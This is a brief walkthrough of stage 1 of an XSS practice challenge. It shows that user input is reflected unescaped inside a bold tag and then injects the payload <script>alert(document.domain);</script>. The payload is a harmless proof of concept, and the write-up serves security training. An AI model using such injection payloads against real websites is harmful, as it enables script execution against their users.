# **XSS Challenges Stage 1**

![](https://i.imgur.com/3D2gKWn.png)

First, try something to get the feedback.

![](https://i.imgur.com/eDj2OwF.png)

Then you will see the feedback in source code.

```
<b>"123"</b>
```

Let's try to make new html tag to see what happen.

![](https://i.imgur.com/R8VN4lA.png)

Yup, it become a part of html code.

```
<b>"<a"</b>
```

Let's insert a `<scipt>` tag with question request.

![](https://i.imgur.com/L1qdoez.png)

```
<script>alert(document.domain);</script>
```

![](https://i.imgur.com/vi04POk.png)
